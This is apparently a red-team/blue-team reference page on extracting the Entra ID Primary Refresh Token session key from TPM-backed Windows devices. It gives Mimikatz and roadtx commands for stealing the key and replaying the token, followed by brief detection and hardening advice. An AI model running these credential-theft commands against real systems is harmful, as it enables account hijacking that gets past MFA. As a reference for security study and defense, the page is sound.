# [CA-UNSC-013]: TPM Key Extraction

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-UNSC-013 |
| **MITRE ATT&CK v18.1** | [Unsecured Credentials: Private Keys (T1552.004)](https://attack.mitre.org/techniques/T1552/004/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows / Entra ID |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Keys stored in the Trusted Platform Module (TPM) are generally secure. However, the *Primary Refresh Token* (PRT) used for Entra ID SSO is protected by a session key that can be extracted if an attacker has SYSTEM privileges on the device. Tools like Mimikatz can interface with the TPM crypto provider to decrypt the PRT, allowing cloud persistence.
- **Attack Surface:** Entra ID Joined Device (Hybrid or Native).
- **Business Impact:** **Session Hijacking**. Access to M365 without MFA (PRT satisfies MFA claims).

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** SYSTEM (Local Admin).
- **Tools:**
    - [Mimikatz](https://github.com/gentilkiwi/mimikatz)
    - [Roadtx](https://github.com/dirkjanm/ROADtools)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Extract PRT (Mimikatz)**
```powershell
token::elevate
dpapi::cloudapkd /run /keyvalue:KEY_FROM_REGISTRY /unprotect
```
*Note: This extracts the session key derived from the TPM, which unlocks the PRT.*

**Step 2: Reuse (Roadtx)**
Use the PRT to authenticate to Graph API.
```bash
roadtx gettokens -r <PRT> -sk <SessionKey>
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Entra ID Logs
| Source | Event | Filter Logic |
|---|---|---|
| **SignInLogs** | Interactive | Sign-in using a PRT from a geo-location or IP that does not match the device's managed state. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Compliance Policy:** Use Intune Conditional Access to block access from devices that are not "Compliant" (health attestation).
*   **Credential Guard:** Helps protect the process space where these keys are handled.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-VALID-001]
> **Next Logical Step:** [LAT-CLOUD-001]
